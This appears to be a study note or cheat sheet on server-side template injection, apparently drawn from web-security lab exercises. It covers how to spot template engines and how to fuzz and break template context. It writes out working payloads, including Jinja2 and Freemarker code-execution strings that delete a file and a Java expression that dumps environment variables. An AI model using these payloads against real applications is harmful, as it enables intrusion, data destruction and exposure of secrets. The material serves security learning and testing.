

### Overview

- Web applications use server-side templating engines (e.g., Jinja2, Twig, Freemarker, Mako) to generate dynamic HTML.
    
- SSTI vulnerabilities occur when user input is embedded in a template without proper sanitization, allowing malicious code execution.
    

---

### SSTI in Whitebox Testing

**Whitebox Testing** provides access to source code, making it easier to spot SSTI vulnerabilities.

#### **Steps to Identify SSTI in Whitebox Testing**

1. **Identify Template Engines:**
    
    - Check which template engine is in use: Jinja2, Twig, Freemarker, Handlebars, etc.
        
    - Look at configuration files and dependencies (`requirements.txt`, `pom.xml`, `package.json`).
        
2. **Locate User Input in Templates:**
    
    - Find places where user input is embedded in templates.
        
    - Look for rendering functions:
        
        - Flask (Python): `render_template()`
            
        - Express (Node.js): `render()`
            
        - Twig (PHP): `template()`
            
        - Freemarker (Java): `processTemplate()`
            
3. **Example Vulnerable Code:**
    
    ```
    $output = $twig->render("Dear " . $_GET['name']);
    ```
    
    - Example payload: `?name={{bad-stuff-here}}`
        

---

### **SSTI in Blackbox Testing**

**Blackbox Testing** involves testing without source code access.

#### **Fuzzing for SSTI**

- Inject special characters used in template expressions:
    
    ```
    ${{<%[%'"}}%\
    ```
    

#### **Check for XSS First**

- Test if input directly triggers **XSS** by injecting arbitrary HTML.
    
- If XSS is absent, responses may show:
    
    - Blank output (`Hello` without a username)
        
    - Encoded characters
        
    - Error messages
        

#### **Break Template Context**

- Attempt to close existing template syntax and inject payloads:
    
    ```
    http://vulnerable-website.com/?greeting=data.username}}<tag>
    ```
    
- Example payloads:
    
    - `{{7*'7'}}` → Returns `49` in Twig, `7777777` in Jinja2
        
    - `GET /?message=<%%3d+7*7 %>` (URL-encoded characters)
        

#### **Exploit with Code Execution**

- Inject OS commands if possible:
    
    ```
    user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
    ```
    
    ```
    <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
    ```
    

#### **Java-Based Templates**

- List environment variables:
    
    ```
    ${T(java.lang.System).getenv()}
    ```
    

#### **Django SSTI Testing**

- Check HackTricks for Django-specific SSTI: [HackTricks - SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
    

---

### **Key Takeaways**

- Identify the template engine in use.
    
- Locate and test user-controlled template inputs.
    
- Fuzz with special characters.
    
- Test for XSS before SSTI.
    
- Close template syntax properly in payloads.
    
- Try OS command injection if applicable.
    

---